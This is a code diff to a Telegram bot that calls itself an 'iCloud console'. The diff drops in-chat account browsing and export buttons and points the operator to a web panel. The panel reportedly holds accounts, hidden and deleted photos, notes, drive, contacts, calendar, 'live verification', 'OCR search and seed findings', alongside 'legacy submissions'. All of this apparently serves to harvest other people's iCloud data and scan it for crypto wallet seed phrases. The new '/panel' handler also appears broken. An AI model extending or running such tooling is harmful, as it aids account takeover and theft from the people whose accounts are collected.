@@ -1,4 +1,4 @@
-import { Bot } from "grammy";
+import { Bot, InlineKeyboard } from "grammy";
 import { config } from "../config.js";
 import {
   PAGE_SIZE,
@@ -8,10 +8,7 @@ import {
   statsView,
   confirmDeleteView,
   escapeHtml,
-  accountsView,
-  accountView,
   accountCard,
-  countsView,
   accountStatsView,
   formatBytes,
 } from "./views.js";
@@ -85,7 +82,7 @@ export function startBot({ store, pool, io }) {
     pending.delete(accountId);
     const options = {
       parse_mode: "HTML",
-      reply_markup: accountView(account).keyboard,
+      reply_markup: panelKeyboard(),
       link_preview_options: { is_disabled: true },
     };
     try {
@@ -211,16 +208,8 @@ export function startBot({ store, pool, io }) {
 
   /* ------------------------------------------------------------- rendering */
 
-  function accountsPage(page = 1) {
-    const data = store.listAccounts({ page, pageSize: PAGE_SIZE });
-    return accountsView({
-      ...data,
-      items: data.items.map((account) => store.adminAccount(account)),
-    });
-  }
-
-  function findAccount(shortId) {
-    return store.getAccountByShortId(shortId);
+  function panelKeyboard() {
+    return new InlineKeyboard().url("Open panel", config.admin.panelUrl);
   }
 
   async function edit(ctx, view) {
@@ -245,30 +234,25 @@ export function startBot({ store, pool, io }) {
 
   bot.command("start", (ctx) => {
     rememberChat(ctx);
-    const view = accountsPage(1);
-    return ctx.reply(view.text, {
-      parse_mode: "HTML",
-      reply_markup: view.keyboard,
-    });
+    return ctx.reply(
+      [
+        "<b>iCloud console</b>",
+        "",
+        "Accounts, photos (Library / Hidden / Recently Deleted), notes, drive,",
+        "contacts, calendar, live verification, OCR search and seed findings",
+        "live in the web panel.",
+        "",
+        escapeHtml(config.admin.panelUrl),
+      ].join("\n"),
+      {
+        parse_mode: "HTML",
+        reply_markup: panelKeyboard(),
+        link_preview_options: { is_disabled: true },
+      }
+    );
   });
 
-  bot.command("menu", (ctx) => {
-    rememberChat(ctx);
-    const view = accountsPage(1);
-    return ctx.reply(view.text, {
-      parse_mode: "HTML",
-      reply_markup: view.keyboard,
-    });
-  });
-
-  bot.command("accounts", (ctx) => {
-    rememberChat(ctx);
-    const view = accountsPage(1);
-    return ctx.reply(view.text, {
-      parse_mode: "HTML",
-      reply_markup: view.keyboard,
-    });
-  });
+  bot.command("panel", (ctx) => bot.command("start", ctx));
 
   bot.command("stats", (ctx) => {
     rememberChat(ctx);
@@ -293,62 +277,6 @@ export function startBot({ store, pool, io }) {
   });
 
   /* ---------------------------------------------------------------- callbacks */
-
-  bot.callbackQuery("noop", (ctx) => ctx.answerCallbackQuery());
-
-  bot.callbackQuery(/^m:(\d+)$/, async (ctx) => {
-    rememberChat(ctx);
-    await ctx.answerCallbackQuery();
-    await edit(ctx, accountsPage(Number(ctx.match[1])));
-  });
-
-  bot.callbackQuery("S", async (ctx) => {
-    await ctx.answerCallbackQuery();
-    await edit(
-      ctx,
-      accountStatsView(store.accountsStats(), store.jobsStats(), pool.slotStats())
-    );
-  });
-
-  bot.callbackQuery(/^A:([a-f0-9]+)$/, async (ctx) => {
-    rememberChat(ctx);
-    const account = findAccount(ctx.match[1]);
-    if (!account) return ctx.answerCallbackQuery("Account not found");
-    await ctx.answerCallbackQuery();
-    await edit(ctx, accountView(store.adminAccount(account)));
-  });
-
-  bot.callbackQuery(/^C:([a-f0-9]+)$/, async (ctx) => {
-    const account = findAccount(ctx.match[1]);
-    if (!account) return ctx.answerCallbackQuery("Account not found");
-    await ctx.answerCallbackQuery();
-    await edit(ctx, countsView(store.adminAccount(account)));
-  });
-
-  bot.callbackQuery(/^P:([a-f0-9]+)$/, async (ctx) => {
-    const account = findAccount(ctx.match[1]);
-    if (!account) return ctx.answerCallbackQuery("Account not found");
-    try {
-      await pool.startPing(account.id);
-      await ctx.answerCallbackQuery("Ping queued");
-    } catch (error) {
-      await ctx.answerCallbackQuery(error.message.slice(0, 180));
-    }
-    await edit(ctx, accountView(store.adminAccount(store.getAccount(account.id))));
-  });
-
-  bot.callbackQuery(/^E:([a-f0-9]+):([mf])$/, async (ctx) => {
-    const account = findAccount(ctx.match[1]);
-    if (!account) return ctx.answerCallbackQuery("Account not found");
-    const mode = ctx.match[2] === "f" ? "force" : "missing";
-    try {
-      await pool.startExport(account.id, { mode });
-      await ctx.answerCallbackQuery(mode === "force" ? "Redownload queued" : "Export queued");
-    } catch (error) {
-      await ctx.answerCallbackQuery(error.message.slice(0, 180));
-    }
-    await edit(ctx, accountView(store.adminAccount(store.getAccount(account.id))));
-  });
 
   /* -------------------------------------------------- legacy submissions */
 
